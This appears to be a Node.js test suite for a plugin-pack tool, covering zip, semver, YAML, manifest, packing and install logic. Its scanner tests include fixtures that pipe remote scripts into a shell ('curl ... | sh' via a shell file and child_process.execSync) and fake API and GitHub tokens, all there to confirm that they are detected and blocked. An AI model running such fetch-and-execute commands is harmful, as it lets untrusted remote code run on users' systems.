/**
 * dsh-modpack 自测：只依赖 node 内置模块，不碰真实 profile。
 * 运行：node test/run.mjs
 */
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { writeZip, readZip } from '../lib/zip.mjs'
import { satisfies, compareVersions } from '../lib/semver.mjs'
import { scanEntries, scanFile } from '../lib/scan.mjs'
import { parseYaml, emitYaml, upsertPatchItem } from '../lib/yamlish.mjs'
import { normalizeManifest } from '../lib/manifest.mjs'
import { checkCompatibility } from '../lib/compat.mjs'
import { buildPack, PackRefused } from '../lib/pack.mjs'
import { inspectPackBuffer, installPack } from '../lib/install.mjs'

const results = []
let failed = 0

function test(name, fn) {
  try {
    const value = fn()
    if (value && typeof value.then === 'function') throw new Error('异步测试请用 testAsync')
    results.push(['ok', name, ''])
  } catch (error) {
    failed++
    results.push(['FAIL', name, String((error && error.stack) || error)])
  }
}

async function testAsync(name, fn) {
  try {
    await fn()
    results.push(['ok', name, ''])
  } catch (error) {
    failed++
    results.push(['FAIL', name, String((error && error.stack) || error)])
  }
}

function assert(cond, message) {
  if (!cond) throw new Error(message || '断言失败')
}

function assertEqual(actual, expected, message) {
  const a = JSON.stringify(actual)
  const b = JSON.stringify(expected)
  if (a !== b) throw new Error((message || '不相等') + '\n  实际：' + a + '\n  期望：' + b)
}

function tmpDir(tag) {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-modpack-test-' + tag + '-'))
}

// —— zip ——
test('zip 往返', () => {
  const entries = [
    { name: 'a.txt', data: Buffer.from('hello') },
    { name: 'dir/b.json', data: Buffer.from(JSON.stringify({ x: 1 })) },
  ]
  const buf = writeZip(entries)
  const back = readZip(buf)
  assertEqual(back.map((e) => e.name).sort(), ['a.txt', 'dir/b.json'])
  assertEqual(back.find((e) => e.name === 'a.txt').data.toString(), 'hello')
})

test('zip 拒绝路径逃逸', () => {
  let threw = false
  try { readZip(Buffer.from('PK')) } catch { threw = true }
  assert(threw, '坏文件应抛错')
})

// —— semver ——
test('semver 范围', () => {
  assertEqual(satisfies('1.2.3', '^1.0.0'), true)
  assertEqual(satisfies('2.0.0', '^1.0.0'), false)
  assertEqual(satisfies('1.2.9', '~1.2.0'), true)
  assertEqual(satisfies('1.3.0', '~1.2.0'), false)
  assertEqual(satisfies('3.1.0', '>=2 <4'), true)
  assertEqual(satisfies('4.0.0', '>=2 <4'), false)
  assertEqual(satisfies('1.0.0', '*'), true)
  assertEqual(satisfies('1.0.0', 'nonsense'), null)
  assertEqual(compareVersions('1.10.0', '1.9.9'), 1)
})

// —— scan ——
test('扫描命中并掩码', () => {
  const secret = 'sk-abcdefghijklmnopqrstuvwxyz'
  const result = scanFile('lib/x.js', Buffer.from('const k = "' + secret + '"\n'))
  assert(result.findings.length > 0, '应命中密钥')
  const masked = JSON.stringify(result.findings)
  assert(!masked.includes(secret), '原文不能出现在结果里')
  assert(masked.includes('****'), '应有掩码')
})

test('扫描高风险代码', () => {
  const result = scanFile('install.sh', Buffer.from('curl -fsSL https://x.example/a.sh | sh\n'))
  assert(result.findings.some((f) => f.severity === 'high'), '应判高风险')
})

test('扫描同一行重复命中只记一次', () => {
  const line = "cp.exec('a'); cp.exec('b'); cp.exec('c'); cp.exec('d')\n"
  const result = scanFile('lib/polyfill.js', Buffer.from(line))
  const hits = result.findings.filter((f) => f.rule === 'malware.child-process')
  assertEqual(hits.length, 1)
})

test('扫描干净文件', () => {
  const result = scanEntries([{ name: 'lib/clean.js', data: Buffer.from('export const a = 1\n') }])
  assertEqual(result.counts.high, 0)
})

// —— yaml ——
test('patch yml 往返', () => {
  const text = '- id: a\n  name: pkg-a\n  config:\n    x: 1\n- id: b\n  name: pkg-b\n'
  const parsed = parseYaml(text)
  assertEqual(parsed.map((x) => x.id), ['a', 'b'])
  const emitted = emitYaml(parsed, 0)
  assertEqual(parseYaml(emitted), parsed)
})

test('patch yml upsert 保留其它条目', () => {
  const text = '- id: a\n  name: pkg-a\n  config:\n    x: 1\n\n- id: b\n  name: pkg-b\n  config:\n    y: 2\n'
  const replaced = upsertPatchItem(text, { id: 'a', name: 'pkg-a', config: { x: 9 } })
  assertEqual(replaced.action, 'replaced')
  const after = parseYaml(replaced.text)
  assertEqual(after.find((x) => x.id === 'a').config, { x: 9 })
  assertEqual(after.find((x) => x.id === 'b').config, { y: 2 })
  const inserted = upsertPatchItem(text, { id: 'c', name: 'pkg-c', config: { z: 3 } })
  assertEqual(inserted.action, 'inserted')
  assertEqual(parseYaml(inserted.text).map((x) => x.id), ['a', 'b', 'c'])
})

// —— manifest ——
test('清单规范校验', () => {
  let threw = false
  try { normalizeManifest({ schema: 1, kind: 'nope', plugins: [] }) } catch { threw = true }
  assert(threw, '错误的 kind 应被拒')
  const ok = normalizeManifest({
    schema: 1,
    kind: 'dsh-modpack',
    name: 'demo',
    format: 'full',
    plugins: [{ name: 'a', version: '1.0.0' }],
  })
  assertEqual(ok.plugins.length, 1)
  let dup = false
  try {
    normalizeManifest({ schema: 1, kind: 'dsh-modpack', name: 'demo', format: 'full', plugins: [{ name: 'a', version: '1.0.0' }, { name: 'a', version: '2.0.0' }] })
  } catch { dup = true }
  assert(dup, '清单里重复插件应被拒（来源可疑）')
})

// —— compat ——
test('兼容性：缺 peer 与 engines', () => {
  const compat = checkCompatibility([
    { name: 'p', version: '1.0.0', peerDependencies: { 'other-pkg': '^2.0.0' }, engines: { dsh: '>=99' } },
  ], { installed: [], dshVersion: '1.0.0', nodeVersion: '20.0.0', config: { licenseAllow: ['MIT'] } })
  assert(compat.findings.some((f) => f.code && /peer/iu.test(f.code)), '应报 peer 问题')
  assert(compat.findings.some((f) => f.message.includes('other-pkg')), '消息里应有包名')
})

// —— 端到端：打包 → 读回 → 演练安装 ——
async function fixture() {
  const home = tmpDir('home')
  process.env.DSH_HOME = home
  const profileDir = path.join(home, 'profiles', 'desktop')
  fs.mkdirSync(profileDir, { recursive: true })
  fs.writeFileSync(path.join(profileDir, 'package.json'), JSON.stringify({
    name: 'desktop',
    private: true,
    dependencies: {},
    dsh: { profile: { bundles: [] } },
  }, null, 2))
  fs.writeFileSync(path.join(profileDir, 'cordis.patch.yml'), '- id: demo\n  name: demo-plugin\n  config:\n    greeting: hi\n')

  const pluginDir = path.join(profileDir, 'node_modules', 'demo-plugin')
  fs.mkdirSync(path.join(pluginDir, 'lib'), { recursive: true })
  fs.writeFileSync(path.join(pluginDir, 'package.json'), JSON.stringify({
    name: 'demo-plugin',
    version: '1.2.3',
    license: 'MIT',
    dsh: { client: { platform: 'web' } },
    exports: { './client': './client.js' },
  }, null, 2))
  fs.writeFileSync(path.join(pluginDir, 'index.js'), 'export function apply() {}\n')
  fs.writeFileSync(path.join(pluginDir, 'lib', 'util.js'), 'export const a = 1\n')

  const installed = [{
    name: 'demo-plugin',
    dirName: 'demo-plugin',
    version: '1.2.3',
    dir: pluginDir,
    realDir: pluginDir,
    pkg: JSON.parse(fs.readFileSync(path.join(pluginDir, 'package.json'), 'utf8')),
    isBundle: true,
    hasClient: true,
    hasPatch: false,
    size: 100,
  }]

  return { home, profileDir, pluginDir, installed }
}

const packContext = (config, profileDir, installed) => ({
  config,
  profileDir,
  dshVersion: '1.0.0',
  installed,
  pluginVersion: '0.1.0',
  parsePatch: parseYaml,
  patchText: fs.readFileSync(path.join(profileDir, 'cordis.patch.yml'), 'utf8'),
})

const baseConfig = {
  includePayload: true,
  licenseAllow: ['MIT', 'Apache-2.0'],
  blockHighRisk: true,
  maxFileBytes: 4 * 1024 * 1024,
  maxPackBytes: 64 * 1024 * 1024,
  scanBeforePack: true,
  scanBeforeInstall: true,
  historyLimit: 20,
  profile: 'desktop',
}

await testAsync('端到端：完整版打包并读回', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: true, confirmLicense: false, name: '测试包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  assert(result.size > 0, '应产出非空文件')
  assertEqual(result.manifest.format, 'full')
  assertEqual(result.manifest.plugins.length, 1)
  assert(result.manifest.plugins[0].configIncluded, '应抓到配置')

  const inspected = inspectPackBuffer(result.buffer, { config: baseConfig })
  assertEqual(inspected.integrity.ok, true)
  assertEqual(inspected.blockingReasons.length, 0)
  assertEqual(inspected.manifest.plugins[0].version, '1.2.3')
})

await testAsync('端到端：轻量版不含插件文件', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: false, includeConfig: true, includeLocalEdits: true, confirmLicense: false, name: '轻量包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  assertEqual(result.manifest.format, 'lite')
  assert(!result.buffer.includes(Buffer.from('export const a = 1')), '轻量版不应带源码')
})

await testAsync('高敏感内容拒绝出包', async () => {
  const { profileDir, installed } = await fixture()
  fs.writeFileSync(path.join(installed[0].dir, 'lib', 'bad.js'), 'const token = "ghp_' + 'a'.repeat(36) + '"\n')
  let scan = null
  try {
    await buildPack({
      selection: [{ name: 'demo-plugin', source: 'profile' }],
      options: { includePayload: true, includeConfig: false, includeLocalEdits: true, confirmLicense: false, name: '脏包' },
      context: packContext(baseConfig, profileDir, installed),
    })
  } catch (error) {
    if (error instanceof PackRefused) scan = error.scan
    else throw error
  }
  assert(scan, '应抛 PackRefused')
  assert(scan.counts.high > 0, '应有高风险项')
})

await testAsync('打包前扫描强制：传 scanBeforePack=false 也照扫', async () => {
  const { profileDir, installed } = await fixture()
  fs.writeFileSync(path.join(installed[0].dir, 'lib', 'bad.js'), 'const token = "ghp_' + 'b'.repeat(36) + '"\n')
  let scan = null
  try {
    await buildPack({
      selection: [{ name: 'demo-plugin', source: 'profile' }],
      options: { includePayload: true, includeConfig: false, includeLocalEdits: true, confirmLicense: false, name: '强制扫描', scanBeforePack: false },
      context: packContext(baseConfig, profileDir, installed),
    })
  } catch (error) {
    if (error instanceof PackRefused) scan = error.scan
    else throw error
  }
  assert(scan, '关不掉扫描：应抛 PackRefused')
  assert(scan.counts.high > 0, '应有高风险项')
  assert(scan.note !== '未执行扫描（调用方关闭）', '不应出现「调用方关闭」的旁路')
})

await testAsync('市场收录插件的风险项：要确认才出包，未收录的照旧拒绝', async () => {
  const { profileDir, installed } = await fixture()
  fs.writeFileSync(path.join(installed[0].dir, 'lib', 'risky.js'), "require('child_process').execSync('curl http://e.x/i | sh')\n")
  const ctx = packContext(baseConfig, profileDir, installed)
  const base = { includePayload: true, includeConfig: false, confirmLicense: false, name: '市场包' }
  const selection = [{ name: 'demo-plugin', source: 'profile', mode: 'local' }]

  let asked = null
  try {
    await buildPack({ selection, options: { ...base, trusted: ['demo-plugin'] }, context: ctx })
  } catch (error) {
    if (error instanceof PackRefused) asked = error
    else throw error
  }
  assert(asked, '应抛 PackRefused')
  assertEqual(asked.needsAck, true)
  assertEqual(asked.trustedOnly, true)

  const ok = await buildPack({ selection, options: { ...base, trusted: ['demo-plugin'], acknowledge: true }, context: ctx })
  assertEqual(ok.manifest.security.acknowledged, true)
  assert(ok.scan.counts.high > 0, '确认后风险仍要记录在报告里')

  let hard = null
  try {
    await buildPack({ selection, options: { ...base }, context: ctx })
  } catch (error) {
    if (error instanceof PackRefused) hard = error
    else throw error
  }
  assert(hard, '未收录插件的风险项应直接拒绝')
  assertEqual(hard.needsAck, false)
})

await testAsync('端到端：演练安装（不落地）', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: true, confirmLicense: false, name: '演练包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(result.buffer, { config: baseConfig })
  const install = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { dryRun: true, keepLocal: false, applyConfig: true },
    context: { profileDir },
  })
  assert(install.actions.length > 0, '应有动作记录')
  assert(install.actions.every((a) => a.ok), '演练应全部通过：' + JSON.stringify(install.actions))
})

await testAsync('逐插件模式：base 取上游原版且不打本机配置', async () => {
  const { profileDir, installed } = await fixture()
  const upstreamPkg = { name: 'demo-plugin', version: '1.2.3', license: 'MIT', dsh: { client: { platform: 'web' } } }
  const result = await buildPack({
    selection: [{
      name: 'demo-plugin',
      source: 'profile',
      mode: 'base',
      download: async () => ({
        pkg: upstreamPkg,
        registry: 'https://registry.npmjs.org',
        tarball: 'https://registry.npmjs.org/demo-plugin/-/demo-plugin-1.2.3.tgz',
        integrity: 'sha512-x',
        entries: [
          { name: 'package.json', data: Buffer.from(JSON.stringify(upstreamPkg)) },
          { name: 'index.js', data: Buffer.from('export function apply() { /* upstream */ }\n') },
        ],
      }),
    }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: true, confirmLicense: false, name: '基础配置包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const plugin = result.manifest.plugins[0]
  assertEqual(plugin.mode, 'base')
  assertEqual(plugin.localEdits, false)
  assertEqual(plugin.configIncluded, false, 'base 模式不应带本机配置')
  assert(result.buffer.includes(Buffer.from('/* upstream */')), '应带上游文件')
  assert(!result.buffer.includes(Buffer.from('export const a = 1')), 'base 模式不应带本机改动文件')
})

await testAsync('逐插件模式：local 带本机代码与配置快照', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile', mode: 'local' }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: false, confirmLicense: false, name: '本地改动包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const plugin = result.manifest.plugins[0]
  assertEqual(plugin.mode, 'local')
  assertEqual(plugin.configIncluded, true, 'local 模式应带本机配置')
  assert(result.buffer.includes(Buffer.from('export const a = 1')), '应带本机文件')
})

await testAsync('逐插件模式：manifest 统一带 mode 字段', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile', mode: 'local' }],
    options: { includePayload: false, includeConfig: false, name: '字段包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(result.buffer, { config: baseConfig })
  assert(inspected.manifest.plugins.every((p) => p.mode === 'local' || p.mode === 'base'), 'mode 必须落到清单')
})

await testAsync('分类：按名字与描述打标签', async () => {
  const { classifyPlugin, categoryLabel } = await import('../lib/classify.mjs')
  assertEqual(classifyPlugin({ name: 'dsh-bili-tools', description: 'B站弹幕与字幕' }).id, 'media')
  assertEqual(classifyPlugin({ name: 'dsh-modpack-kit', description: '打包整合包' }).id, 'pack')
  assertEqual(classifyPlugin({ name: 'dsh-theme-neon', description: '界面主题' }).id, 'ui')
  assertEqual(classifyPlugin({ name: 'zzz', description: '' }).id, 'other')
  assertEqual(categoryLabel('pack'), '打包与分发')
  assertEqual(classifyPlugin({ title: 'MCP 开发调试器', description: 'debug 工具' }).id, 'dev')
})

await testAsync('安装：配置回填不能冲掉其它条目（回归 readPatch 返回字符串）', async () => {
  const { profileDir, installed } = await fixture()
  const built = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: true, name: '回填包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(built.buffer, { config: baseConfig })
  assertEqual(inspected.integrity.ok, true)

  const targetHome = tmpDir('target-home')
  process.env.DSH_HOME = targetHome
  const targetProfile = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(targetProfile, { recursive: true })
  fs.writeFileSync(path.join(targetProfile, 'package.json'), JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
  }, null, 2))
  const before = ['- id: keep-me', '  name: other-plugin', '  config:', '    x: 1', ''].join('\n')
  fs.writeFileSync(path.join(targetProfile, 'cordis.patch.yml'), before)

  const result = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { force: true, applyConfig: true, keepLocal: false, enableBundles: false },
    context: { profileDir: targetProfile, runCli: async () => ({ code: 0, output: 'fake cli' }) },
  })
  assertEqual(result.ok, true)
  const after = fs.readFileSync(path.join(targetProfile, 'cordis.patch.yml'), 'utf8')
  assert(after.includes('keep-me'), '别的配置条目不能被冲掉：' + after)
  assert(after.includes('greeting'), '目标插件的配置没写回去：' + after)
})

await testAsync('安装：不启用时 bundle 清单要被撤回原样', async () => {
  const { profileDir, installed } = await fixture()
  const built = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: true, includeConfig: false, name: '不启用包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(built.buffer, { config: baseConfig })

  const targetHome = tmpDir('bundle-home')
  process.env.DSH_HOME = targetHome
  const targetProfile = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(targetProfile, { recursive: true })
  const profileJson = path.join(targetProfile, 'package.json')
  fs.writeFileSync(profileJson, JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: ['keep-me'] } },
  }, null, 2))
  fs.writeFileSync(path.join(targetProfile, 'cordis.patch.yml'), '- id: keep\n  name: keep-me\n')

  // 假的 dsh CLI：模拟 add 之后写入依赖并把自己登记进 bundles
  const fakeCli = async () => {
    const pkg = JSON.parse(fs.readFileSync(profileJson, 'utf8'))
    pkg.dependencies['demo-plugin'] = 'file:' + path.join(targetProfile, 'node_modules', 'demo-plugin')
    const bundles = new Set(pkg.dsh.profile.bundles)
    bundles.add('demo-plugin')
    pkg.dsh.profile.bundles = [...bundles]
    fs.writeFileSync(profileJson, JSON.stringify(pkg, null, 2))
    return { code: 0, output: 'fake cli added' }
  }

  const result = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { force: true, applyConfig: false, keepLocal: false, enableBundles: false },
    context: { profileDir: targetProfile, runCli: fakeCli },
  })
  assertEqual(result.ok, true)
  const after = JSON.parse(fs.readFileSync(profileJson, 'utf8'))
  assert(after.dependencies['demo-plugin'], '依赖应该照常写入')
  assertEqual(after.dsh.profile.bundles.length, 1, 'bundles 里只应剩原来的 keep-me')
  assertEqual(after.dsh.profile.bundles[0], 'keep-me')
})

for (const [state, name, detail] of results) {
  if (state === 'ok') console.log('ok   ' + name)
  else console.log('FAIL ' + name + '\n' + detail)
}
console.log('\n' + (results.length - failed) + '/' + results.length + ' 通过')
process.exitCode = failed === 0 ? 0 : 1
